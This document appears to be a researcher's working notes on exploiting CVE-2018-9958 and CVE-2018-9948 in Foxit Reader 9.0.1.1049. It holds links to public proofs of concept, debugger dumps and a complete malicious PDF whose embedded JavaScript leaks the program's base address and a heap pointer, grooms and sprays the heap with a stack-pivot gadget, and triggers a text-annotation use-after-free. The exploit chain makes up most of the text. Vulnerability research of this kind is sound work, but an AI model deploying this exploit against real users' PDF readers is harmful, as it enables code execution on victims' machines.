# [CVE-2018-9958/CVE-2018-9948 Foxit Reader 9.0.1.1049 - Buffer Overflow (ASLR & DEP Bypass)](https://www.exploit-db.com/exploits/45163)

### References:

- [Exploit Code](https://www.exploit-db.com/exploits/45163)

- [Download Link](https://www.filepuma.com/download/foxit_pdf_reader_9.0.1.1049-17632/)

- [srcincite write up](https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html)

- [srcincite slides](https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html)

- [srcincite poc which pwns win7 and win10](https://srcincite.io/pocs/cve-2018-99%7B48,58%7D.pdf.txt)

- [Heap Spray + proper shellcode using ROP](https://github.com/manojcode/Foxit-Reader-RCE-with-virualalloc-and-shellcode-for-CVE-2018-9948-and-CVE-2018-9958/tree/master)


CVE-2018-9948 Information Leak via Uninitialized Pointers

```
Foo *bar;
bar->search('test');
```



https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/application-verifier-debugging-application-verifier-stops

mine alerted with e0e0e0e0 

(+) DEBUG ASIN: (+) disabling heap hook
Breakpoint 4 hit
(+) disabling heap alloc bp.


kinda buggy, you run bridgit and you open pdf, need to pause and g to trigger the dumping of uninitalized memory


0x20 0x03927334
0x60 0x0307bb6c 
0x70 0x03927334


0xb0 0x05eb 
0xc0 0x05eb 
0xd0 0x05eb 
0xe0 0x05eb 
0xf0 0x05eb 


00000298 offset

i have to allocate delete allocate delete as opposed to allocate allocate allocate...

for the leaking heap pointers, i think that the int32view[1] is a pointer which points to heap chunks, so all we need to do is to

XXXXX0

annotate

XXXXA8


XXXXX0 -> vtable
XXXXX8 -> heap pointer

int32Array

XXXXA8

allocate LFH

fill the heap chunks and pray that annotation object heap pointer will point to the filled values of heap

leak heap chunk

allocate LFH

leak vtable

modify allocation

check if     // reclaim
    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);
    
    // alloc at the freed location
    alloc_at_leak();
    
    // leak a heap chunk of size 0x40
    heap_ptr = stolen[1];
}

check if the stoelen[1] value changes (shouldnt)

heap pointer seems to have a size of 0x40

0:038> dc 0cd8e8f8
0cd8e8f8  75746572 676e6e72 72724565 0072726f  returnngeErrorr.
0cd8e908  00000000 00000010 00000000 0ce2b568  ............h...
0cd8e918  00000000 00000000 00000010 00000000  ................
0cd8e928  00000000 00000000 0000000a 08d82288  ............."..
0cd8e938  3f06fa8e 88061d00 00000000 00000000  ...?............
0cd8e948  00000000 00000000 00000000 00000000  ................
0cd8e958  00000000 0cdeb86c 00000000 00000000  ....l...........
0cd8e968  00000000 00000000 00000000 00000000  ................

spam allocations of 0x40 bytes?

CVE-2018-9958 Text Annotation Use-after-Free

Exploitation 1: Leak Text Annotation Object via Uninitialized Pointers

Exploitation 2: Leak FoxReader.exe Base Address

Exploitation 3.1: Leak Heap Pointer to 0x40-sized Heap Chunk

Exploitation 3.2: Heap Spray

Exploitation 4: Use-After-Free

%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (

var heap_ptr   = 0;
var foxit_base = 0;
var say_no_to_heap_spray = [];

var num_of_abs = 0x80
var length_of_abs = 0x40

function activate_lfh(size){
    var arr = new Array(size);
    for(var i = 0; i < size; i++){
        arr[i] = this.addAnnot({type: "Text"});
        if (typeof arr[i] == "object"){
            arr[i].destroy();
        }
    }
}

function leak_everything(){
    activate_lfh(0x400);

    // Allocate heap chunks so that the (freed) annotate object will point to our controlled allocated heap chunks
    for (var i = 0; i < num_of_abs; i++){
        say_no_to_heap_spray[i] = new Int32Array(new ArrayBuffer(length_of_abs));
    }

    var ab = new ArrayBuffer(0x5c);
    var intAb = new Int32Array(ab);
    var leaked = intAb[0] & 0xffff0000;
    foxit_base = leaked - 0x01f50000;
    heap_ptr   = intAb[1];
    debug_address("foxit_base", foxit_base);
    debug_address("heap_ptr", heap_ptr);
    for (var i = 0; i < num_of_abs; i++){
        for (var j = 0; j < say_no_to_heap_spray[i].length; j++){
            say_no_to_heap_spray[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4 // 02c7ee23
        }
    }
    debug_address("heap_ptr", heap_ptr);
}

function heap_spray(size){
    var arr = new Array(size);
    for (var i = 0; i < arr.length; i++) {
        // re-claim and stack pivot-0x8
        arr[i] = new ArrayBuffer(0x10000-0x8);//0xFFF8 // 0x0aa40000-0x0ba0f000: 0b0b0b0b
        var claimed = new Int32Array(arr[i]);
        var c_length = claimed.length;
        claimed[0] = 0x54303057
        for (var j = 1; j < c_length; j++) {
            claimed[j] = 0x41414141;
        }
    }
}

function use_heap_leak(){ 
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x5c);
        var rop = new Int32Array(arr[i]);
        for (var j = 0x0; j < rop.length; j++) {
            rop[j] = heap_ptr;
        }
    }
}

function use_heap_spray(){ 
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x5c);
        var rop = new Int32Array(arr[i]);
        for (var j = 0x0; j < rop.length; j++) {
            rop[j] = 0x1b000048-0x8;
        }
    }
}

function trigger_uaf(){
    var that = this;
    var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
    var arr = [1];
    Object.defineProperties(arr,{
        "0":{ 
            get: function () {

                // free
                that.getAnnot(0, "uaf").destroy();

                // reclaim freed memory
                //use_heap_spray();
                use_heap_leak();
                return 1; 
            }
        }
    });
    // re-use
    a.point = arr;
}

function debug(statement) {
    app.alert(util.printf("%s", statement));
}

function debug_address(statement, number) {
    app.alert(util.printf("%s 0x%08x", statement, number));
}

function main(){
    //heap_spray(0x1000);
    leak_everything();
    
    trigger_uaf();
}

if (app.platform == "WIN"){
    if (app.isFoxit == "Foxit Reader"){
        if (app.appFoxitVersion == "9.0.1.1049"){
            main();
        }
    }
}

)>> trailer <</Root 1 0 R>>

